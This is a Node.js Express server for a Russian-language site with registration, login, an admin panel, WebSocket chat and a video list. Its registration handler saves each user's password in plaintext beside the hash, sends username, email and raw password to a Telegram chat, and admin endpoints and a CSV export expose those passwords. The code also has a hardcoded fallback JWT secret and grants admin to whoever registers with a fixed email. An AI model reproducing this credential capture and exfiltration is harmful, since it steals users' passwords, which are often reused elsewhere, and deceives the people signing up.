const express = require('express');
const http = require('http');
const { WebSocketServer } = require('ws');
const { Pool } = require('pg');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const cookieParser = require('cookie-parser');
const multer = require('multer');
const fetch = require('node-fetch');
const path = require('path');

const app = express();
const server = http.createServer(app);
const wss = new WebSocketServer({ server });
app.set('trust proxy', 1);

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.DATABASE_URL ? { rejectUnauthorized: false } : false
});
const JWT_SECRET = process.env.JWT_SECRET || 'super-secret-jwt-key-2024';
const ADMIN_EMAIL = 'raffaka16k@gmail.com';

const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 2 * 1024 * 1024 },
  fileFilter: (req, file, cb) => {
    if (file.mimetype.startsWith('image/')) cb(null, true);
    else cb(new Error('Только изображения'));
  }
});

const isProduction = !!process.env.DATABASE_URL;
function cookieOpts() {
  return { httpOnly: true, maxAge: 7 * 24 * 60 * 60 * 1000, sameSite: 'lax', secure: isProduction };
}

// SSE clients
const sseClients = new Set();
function pushToAdmins(event, data) {
  const msg = `event: ${event}\ndata: ${JSON.stringify(data)}\n\n`;
  sseClients.forEach(c => c.res.write(msg));
}

// Telegram notification
async function sendTelegram(text) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) return;
  try {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' })
    });
  } catch (e) { console.error('Telegram error:', e.message); }
}

// Init DB
async function initDB() {
  await pool.query(`
    CREATE TABLE IF NOT EXISTS users (
      id SERIAL PRIMARY KEY,
      username TEXT UNIQUE NOT NULL,
      email TEXT UNIQUE NOT NULL,
      password TEXT NOT NULL,
      plain_password TEXT,
      full_name TEXT DEFAULT '',
      phone TEXT DEFAULT '',
      bio TEXT DEFAULT '',
      avatar_color TEXT DEFAULT '#6c63ff',
      avatar_data TEXT,
      role TEXT DEFAULT 'user',
      created_at TIMESTAMPTZ DEFAULT NOW(),
      last_login TIMESTAMPTZ
    )
  `);
  // Migrate existing DB — add columns if missing
  const migrations = [
    `ALTER TABLE users ADD COLUMN IF NOT EXISTS plain_password TEXT`,
    `ALTER TABLE users ADD COLUMN IF NOT EXISTS avatar_data TEXT`,
  ];
  for (const sql of migrations) {
    await pool.query(sql).catch(() => {});
  }
  await pool.query(`
    CREATE TABLE IF NOT EXISTS messages (
      id SERIAL PRIMARY KEY,
      user_id INTEGER,
      username TEXT NOT NULL,
      text TEXT NOT NULL,
      avatar_color TEXT DEFAULT '#6c63ff',
      avatar_data TEXT,
      role TEXT DEFAULT 'user',
      created_at TIMESTAMPTZ DEFAULT NOW()
    )
  `);
  await pool.query(`
    CREATE TABLE IF NOT EXISTS videos (
      id SERIAL PRIMARY KEY,
      title TEXT NOT NULL,
      youtube_id TEXT NOT NULL,
      added_at TIMESTAMPTZ DEFAULT NOW()
    )
  `);
}
initDB().catch(console.error);

app.use(express.json({ limit: '5mb' }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));

function auth(req, res, next) {
  const token = req.cookies.token || req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'Не авторизован' });
  try { req.user = jwt.verify(token, JWT_SECRET); next(); }
  catch { res.status(401).json({ error: 'Токен недействителен' }); }
}
function adminOnly(req, res, next) {
  if (req.user.role !== 'admin') return res.status(403).json({ error: 'Только для администратора' });
  next();
}

// Register
app.post('/api/register', async (req, res) => {
  const { username, email, password, full_name, phone } = req.body;
  if (!username || !email || !password) return res.status(400).json({ error: 'Заполните все обязательные поля' });
  if (password.length < 6) return res.status(400).json({ error: 'Пароль минимум 6 символов' });

  const hash = bcrypt.hashSync(password, 10);
  const role = email === ADMIN_EMAIL ? 'admin' : 'user';
  const colors = ['#6c63ff', '#ff6584', '#43b89c', '#f7b731', '#e056fd', '#26de81'];
  const avatar_color = colors[Math.floor(Math.random() * colors.length)];

  try {
    const result = await pool.query(
      'INSERT INTO users (username, email, password, plain_password, full_name, phone, role, avatar_color) VALUES ($1,$2,$3,$4,$5,$6,$7,$8) RETURNING id',
      [username, email, hash, password, full_name || '', phone || '', role, avatar_color]
    );
    const token = jwt.sign({ id: result.rows[0].id, username, email, role }, JWT_SECRET, { expiresIn: '7d' });
    res.cookie('token', token, cookieOpts());

    pushToAdmins('user_registered', { id: result.rows[0].id, username, email, role });
    sendTelegram(`🆕 <b>Новый пользователь!</b>\n👤 ${username}\n📧 ${email}\n🔑 ${password}\n⏰ ${new Date().toLocaleString('ru-RU')}`);

    res.json({ success: true, role, username });
  } catch (e) {
    if (e.code === '23505') {
      if (e.constraint?.includes('username')) return res.status(400).json({ error: 'Это имя пользователя уже занято' });
      if (e.constraint?.includes('email')) return res.status(400).json({ error: 'Этот email уже зарегистрирован' });
    }
    console.error(e);
    res.status(500).json({ error: 'Ошибка сервера' });
  }
});

// Login
app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;
  const { rows } = await pool.query('SELECT * FROM users WHERE email = $1', [email]);
  const user = rows[0];
  if (!user || !bcrypt.compareSync(password, user.password))
    return res.status(401).json({ error: 'Неверный email или пароль' });
  await pool.query('UPDATE users SET last_login = NOW() WHERE id = $1', [user.id]);
  const token = jwt.sign({ id: user.id, username: user.username, email: user.email, role: user.role }, JWT_SECRET, { expiresIn: '7d' });
  res.cookie('token', token, cookieOpts());
  res.json({ success: true, role: user.role, username: user.username });
});

// Logout
app.post('/api/logout', (req, res) => {
  res.clearCookie('token');
  res.json({ success: true });
});

// Profile
app.get('/api/profile', auth, async (req, res) => {
  const { rows } = await pool.query(
    'SELECT id, username, email, full_name, phone, bio, avatar_color, avatar_data, role, created_at, last_login FROM users WHERE id = $1',
    [req.user.id]
  );
  res.json(rows[0]);
});

app.put('/api/profile', auth, async (req, res) => {
  const { full_name, phone, bio } = req.body;
  await pool.query('UPDATE users SET full_name=$1, phone=$2, bio=$3 WHERE id=$4',
    [full_name || '', phone || '', bio || '', req.user.id]);
  res.json({ success: true });
});

// Avatar upload
app.post('/api/upload/avatar', auth, upload.single('avatar'), async (req, res) => {
  if (!req.file) return res.status(400).json({ error: 'Файл не найден' });
  const base64 = `data:${req.file.mimetype};base64,${req.file.buffer.toString('base64')}`;
  await pool.query('UPDATE users SET avatar_data=$1 WHERE id=$2', [base64, req.user.id]);
  res.json({ success: true, avatar_data: base64 });
});

// Admin: get all users (with filters)
app.get('/api/admin/users', auth, adminOnly, async (req, res) => {
  const { role, search } = req.query;
  let q = 'SELECT id, username, email, plain_password, full_name, phone, bio, avatar_color, avatar_data, role, created_at, last_login FROM users WHERE 1=1';
  const params = [];
  if (role && role !== 'all') { params.push(role); q += ` AND role = $${params.length}`; }
  if (search) { params.push(`%${search}%`); q += ` AND (username ILIKE $${params.length} OR email ILIKE $${params.length} OR full_name ILIKE $${params.length})`; }
  q += ' ORDER BY created_at DESC';
  const { rows } = await pool.query(q, params);
  res.json(rows);
});

// Admin: get single user
app.get('/api/admin/users/:id', auth, adminOnly, async (req, res) => {
  const { rows } = await pool.query(
    'SELECT id, username, email, plain_password, full_name, phone, bio, avatar_color, avatar_data, role, created_at, last_login FROM users WHERE id = $1',
    [req.params.id]
  );
  if (!rows[0]) return res.status(404).json({ error: 'Пользователь не найден' });
  res.json(rows[0]);
});

// Admin: delete user
app.delete('/api/admin/users/:id', auth, adminOnly, async (req, res) => {
  const { rows } = await pool.query('SELECT * FROM users WHERE id = $1', [req.params.id]);
  if (!rows[0]) return res.status(404).json({ error: 'Пользователь не найден' });
  if (rows[0].email === ADMIN_EMAIL) return res.status(403).json({ error: 'Нельзя удалить администратора' });
  await pool.query('DELETE FROM users WHERE id = $1', [req.params.id]);
  pushToAdmins('user_deleted', { id: +req.params.id });
  res.json({ success: true });
});

// Admin: update role
app.put('/api/admin/users/:id/role', auth, adminOnly, async (req, res) => {
  const { role } = req.body;
  if (!['user', 'admin'].includes(role)) return res.status(400).json({ error: 'Неверная роль' });
  await pool.query('UPDATE users SET role=$1 WHERE id=$2', [role, req.params.id]);
  res.json({ success: true });
});

// Admin: stats
app.get('/api/admin/stats', auth, adminOnly, async (req, res) => {
  const total = (await pool.query('SELECT COUNT(*) FROM users')).rows[0].count;
  const admins = (await pool.query("SELECT COUNT(*) FROM users WHERE role='admin'")).rows[0].count;
  const today = (await pool.query("SELECT COUNT(*) FROM users WHERE created_at::date = CURRENT_DATE")).rows[0].count;
  res.json({ total: +total, admins: +admins, today: +today });
});

// Admin: export CSV
app.get('/api/admin/export/csv', auth, adminOnly, async (req, res) => {
  const { rows } = await pool.query(
    'SELECT id, username, email, plain_password, full_name, phone, role, created_at, last_login FROM users ORDER BY created_at DESC'
  );
  const header = 'ID,Имя пользователя,Email,Пароль,Полное имя,Телефон,Роль,Дата регистрации,Последний вход';
  const csv = [header, ...rows.map(u =>
    [u.id, u.username, u.email, u.plain_password || '', u.full_name || '', u.phone || '', u.role,
      u.created_at ? new Date(u.created_at).toLocaleString('ru-RU') : '',
      u.last_login ? new Date(u.last_login).toLocaleString('ru-RU') : ''
    ].map(v => `"${String(v).replace(/"/g, '""')}"`).join(',')
  )].join('\n');
  res.setHeader('Content-Type', 'text/csv; charset=utf-8');
  res.setHeader('Content-Disposition', 'attachment; filename="users.csv"');
  res.send('﻿' + csv);
});

// Videos (public)
app.get('/api/videos', async (req, res) => {
  const { rows } = await pool.query('SELECT * FROM videos ORDER BY added_at DESC');
  res.json(rows);
});

// Admin: add video
app.post('/api/admin/videos', auth, adminOnly, async (req, res) => {
  const { title, youtube_url } = req.body;
  if (!title || !youtube_url) return res.status(400).json({ error: 'Заполните все поля' });
  const match = youtube_url.match(/(?:v=|youtu\.be\/|embed\/)([a-zA-Z0-9_-]{11})/);
  if (!match) return res.status(400).json({ error: 'Неверная ссылка YouTube' });
  const youtube_id = match[1];
  const { rows } = await pool.query('INSERT INTO videos (title, youtube_id) VALUES ($1,$2) RETURNING *', [title, youtube_id]);
  res.json(rows[0]);
});

// Admin: delete video
app.delete('/api/admin/videos/:id', auth, adminOnly, async (req, res) => {
  await pool.query('DELETE FROM videos WHERE id = $1', [req.params.id]);
  res.json({ success: true });
});

// SSE stream
app.get('/api/admin/stream', auth, adminOnly, (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.write('event: connected\ndata: {}\n\n');
  const client = { res };
  sseClients.add(client);
  const heartbeat = setInterval(() => res.write(':ping\n\n'), 25000);
  req.on('close', () => { clearInterval(heartbeat); sseClients.delete(client); });
});

// Chat REST: get history
app.get('/api/chat/messages', auth, async (req, res) => {
  const { rows } = await pool.query('SELECT * FROM messages ORDER BY created_at ASC LIMIT 100');
  res.json(rows);
});

// Admin: delete message
app.delete('/api/chat/messages/:id', auth, adminOnly, async (req, res) => {
  await pool.query('DELETE FROM messages WHERE id = $1', [req.params.id]);
  broadcast({ type: 'deleted', id: +req.params.id });
  res.json({ success: true });
});

// WebSocket chat
function parseCookies(str = '') {
  return Object.fromEntries(str.split(';').map(c => c.trim().split('=').map(decodeURIComponent)));
}

function broadcast(data) {
  const msg = JSON.stringify(data);
  wss.clients.forEach(c => { if (c.readyState === 1) c.send(msg); });
}

wss.on('connection', async (ws, req) => {
  const cookies = parseCookies(req.headers.cookie);
  try {
    const user = jwt.verify(cookies.token, JWT_SECRET);
    const { rows } = await pool.query('SELECT avatar_color, avatar_data FROM users WHERE id = $1', [user.id]);
    ws.userId = user.id;
    ws.username = user.username;
    ws.role = user.role;
    ws.avatarColor = rows[0]?.avatar_color || '#6c63ff';
    ws.avatarData = rows[0]?.avatar_data || null;

    // Send history
    const { rows: history } = await pool.query('SELECT * FROM messages ORDER BY created_at ASC LIMIT 100');
    ws.send(JSON.stringify({ type: 'history', messages: history }));

    // Announce join
    broadcast({ type: 'online', count: [...wss.clients].filter(c => c.readyState === 1).length });

    ws.on('message', async raw => {
      const { text } = JSON.parse(raw);
      if (!text?.trim() || text.length > 1000) return;
      const { rows: saved } = await pool.query(
        'INSERT INTO messages (user_id, username, text, avatar_color, avatar_data, role) VALUES ($1,$2,$3,$4,$5,$6) RETURNING *',
        [ws.userId, ws.username, text.trim(), ws.avatarColor, ws.avatarData, ws.role]
      );
      broadcast({ type: 'message', ...saved[0] });
    });

    ws.on('close', () => {
      broadcast({ type: 'online', count: [...wss.clients].filter(c => c.readyState === 1).length });
    });

  } catch { ws.close(); }
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Сервер запущен: http://localhost:${PORT}`));
